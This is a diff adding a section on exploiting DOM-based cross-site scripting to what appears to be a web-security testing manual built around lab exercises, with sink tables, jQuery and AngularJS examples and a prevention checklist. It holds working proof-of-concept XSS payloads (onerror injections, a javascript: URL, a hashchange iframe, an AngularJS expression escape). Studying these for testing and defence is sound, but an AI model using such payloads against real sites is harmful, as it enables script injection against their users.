@@ -61,6 +61,75 @@ Advanced XSS Testing Manual
 // Classic hashchange exploit
 <iframe src="https://vulnerable.com#" onload="this.src+='<img src=x onerror=alert(1)>'">
 
+### 1.4 Exploiting DOM XSS with Different Sources and Sinks
+
+In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. Different sources and sinks have varying properties that affect exploitability:
+
+#### Common Sink Patterns
+
+| Sink | Exploitability | Example Payload | Lab Reference |
+| --- | --- | --- | --- |
+| `document.write()` | High - accepts script tags | `document.write('<script>alert(document.domain)</script>')` | DOM XSS using location.search (Solved) |
+| `innerHTML` | Medium - requires alternative vectors | `element.innerHTML='<img src=1 onerror=alert(1)>'` | DOM XSS in innerHTML sink (Solved) |
+| `location.hash` | Context-dependent | `#<img src=x onerror=alert(1)>` | jQuery hashchange (Solved) |
+
+#### Framework-Specific Sinks
+
+##### jQuery Vulnerabilities
+
+// Attribute manipulation
+$('#backLink').attr("href", location.search);
+// Exploit: ?returnUrl=javascript:alert(document.domain)
+
+// Selector injection
+$(window).on('hashchange', function() {
+    $(location.hash).scrollIntoView();
+});
+// Exploit via iframe:
+<iframe src="https://vulnerable.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+
+##### AngularJS Vulnerabilities
+
+<div ng-app>
+  {{constructor.constructor('alert(1)')()}}
+</div>
+// Lab: DOM XSS in AngularJS expression (Not solved)
+
+#### Hybrid DOM XSS Patterns
+
+| Type | Description | Example | Lab Status |
+| --- | --- | --- | --- |
+| Reflected DOM | Server echoes input into JS context | `eval('var data = "'+userInput+'"')` | Reflected DOM XSS (Not solved) |
+| Stored DOM | Server stores then serves malicious payload | `element.innerHTML = storedData` | Stored DOM XSS (Not solved) |
+
+#### Complete Sink Reference
+
+##### Native JavaScript Sinks
+
+*   `document.write()`
+*   `document.writeln()`
+*   `element.innerHTML`
+*   `element.outerHTML`
+*   `element.insertAdjacentHTML`
+*   `element.onevent`
+
+##### jQuery Sinks
+
+*   `add()`
+*   `html()`
+*   `append()`
+*   `prepend()`
+*   `jQuery.parseHTML()`
+*   `$() (selector)`
+
+#### Prevention Checklist
+
+*   Avoid dynamic HTML writing with untrusted data
+*   Use `textContent` instead of `innerHTML`
+*   Implement Content Security Policy (CSP)
+*   Sanitize inputs in framework contexts (AngularJS, React, etc.)
+*   Regularly audit third-party libraries
+
 ## 2\. Reflected XSS Mastery
 
 ### 2.1 Context-Specific Payloads
